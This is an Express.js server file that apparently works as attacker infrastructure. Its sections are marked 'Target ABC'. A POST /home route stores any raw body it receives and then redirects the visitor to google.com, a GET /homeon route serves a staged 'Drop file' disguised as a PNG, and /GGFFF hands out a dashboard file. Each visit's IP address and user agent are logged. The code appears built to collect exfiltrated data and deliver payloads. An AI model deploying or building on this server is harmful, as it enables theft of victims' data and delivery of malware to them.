const express = require('express');
const app = express();
const fs = require('fs');
const path = require('path');
const request = require('request');
var bodyParser = require('body-parser');

// NEW
function defaultContentTypeMiddleware(req, res, next) {
  req.headers['content-type'] =
    req.headers['content-type'] || 'application/octet-stream';
  next();
}
app.use(defaultContentTypeMiddleware);
// NEW

app.use(bodyParser.raw({ limit: '10000kb', type: '*/*' }));
function calcTime(offset) {
  let d = new Date();
  let utc = d.getTime() + d.getTimezoneOffset() * 60000;
  let nd = new Date(utc + 3600000 * offset);
  return nd.toLocaleString();
}
function logByRoute(prefix, req, res) {
  fs.appendFileSync('log.txt', '=========' + prefix + '=======\n');
  const data = `${calcTime('+7')} - ${
    req.headers['x-forwarded-for'].split(',')[0]
  } - ${req.headers['user-agent']} `;
  fs.appendFileSync('log.txt', prefix + ' - ' + data + '\n');
}

// =============Target ABC ====================

app.post('/home', function (request, response) {
  const notar = 'home';
  const fname = 'home.txt'; // Info POST
  fs.appendFileSync(fname, request.body);
  response.redirect('https://google.com');
  logByRoute(notar + ' Post Info', request, response);
});
//download file
app.get('/homeon', function (request, response) {
  const notar = 'homeon';
  const fname = 'homeon.png'; // Drop file
  fs.exists(fname, function (exists) {
    if (exists) {
      logByRoute(notar + ' Download File ' + fname, request, response);
      response.writeHead(200, {
        'Content-Type': 'application/octet-stream',
        'Content-Disposition': 'attachment; filename=' + fname,
      });
      fs.createReadStream(fname).pipe(response);
    } else {
      logByRoute(notar + ' Can not download file ' + fname, request, response);
      response.writeHead(400, { 'Content-Type': 'text/plain' });
      response.end('ERROR File does not exist');
    }
  });
});
// =============Target ABC ====================
// =============Target ABC ====================
app.get('/GGFFF', function (request, response) {
  const filePath = 'dashboard.txt';
  fs.exists(filePath, function (exists) {
    if (exists) {
      response.writeHead(200, {
        'Content-Type': 'application/octet-stream',
        'Content-Disposition': 'attachment; filename=' + filePath,
      });
      fs.createReadStream(filePath).pipe(response);
    } else {
      response.writeHead(400, { 'Content-Type': 'text/plain' });
      response.end('ERROR File does not exist');
    }
  });
});

// listen for requests :)
const listener = app.listen(process.env.PORT, function () {
  console.log('Your app is listening on port ' + listener.address().port);
});
